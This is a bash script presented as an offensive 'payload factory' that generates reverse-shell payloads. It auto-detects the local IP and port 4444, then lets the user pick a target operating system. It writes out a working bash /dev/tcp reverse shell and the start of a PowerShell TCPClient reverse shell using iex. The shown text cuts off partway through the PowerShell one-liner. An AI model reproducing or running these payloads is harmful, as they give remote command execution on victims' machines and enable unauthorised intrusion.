#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ MODULE: THE PAYLOAD FACTORY v1.0 [LIGHTWEIGHT]                           ║
# ║ TARGET: REVERSE SHELL GENERATION                                         ║
# ║ AUTHOR: △ ᛋᛅᚱᛒᛅᚾᛏᛒᛁᛏᛅ ▽                                                ║
# ╚══════════════════════════════════════════════════════════════════════════╝

# --- [ COLORS ] ---
R='\033[1;31m'
DR='\033[0;31m'
G='\033[1;30m'
W='\033[1;37m'
Y='\033[1;33m'
P='\033[1;35m'
C='\033[0;36m'
N='\033[0m'

# --- [ INIT ] ---
clear
echo -e "${R}"
echo "   █▀▄ █▀▄ █▀▀ █▀█ █ █ █▀▀ █▀▄"
echo "   █▀▄ █▀▄ █▀▀ █▀█ █▀▄ █▀▀ █▀▄"
echo "   ▀▀  ▀ ▀ ▀▀▀ ▀ ▀ ▀ ▀ ▀▀▀ ▀ ▀"
echo -e "   ${G}:: THE PAYLOAD FACTORY ::${N}"
echo ""

# Get Local IP (LHOST)
LHOST=$(ifconfig 2>/dev/null | grep -oP 'inet \K[\d.]+' | grep -v '127.0.0.1' | head -n1)
LPORT="4444"

echo -e "${W}CONFIGURATION:${N}"
echo -e "${G}LHOST (Your IP):${N} ${Y}$LHOST${N}"
echo -e "${G}LPORT (Listener):${N} ${Y}$LPORT${N}"
echo ""
echo -e "${W}SELECT TARGET OS:${N}"
echo -e "${R}[1]${W} LINUX / MACOS (Bash)${N}"
echo -e "${R}[2]${W} WINDOWS (Powershell)${N}"
echo -e "${R}[3]${W} ANDROID / ANY (Python)${N}"
echo -e "${R}[4]${W} NETCAT (Raw)${N}"
echo -e "${G}[x] ABORT${N}"
echo ""
read -p "TARGET >> " choice

PAYLOAD_FILE="payload"

case $choice in
    1)
        # Bash Reverse Shell
        echo -e "${P}GENERATING BASH PAYLOAD...${N}"
        PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        EXT=".sh"
        ;;
    2)
        # Powershell Reverse Shell (One-Liner)
        echo -e "${P}GENERATING POWERSHELL PAYLOAD...${N}"
        PAYLOAD="\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 

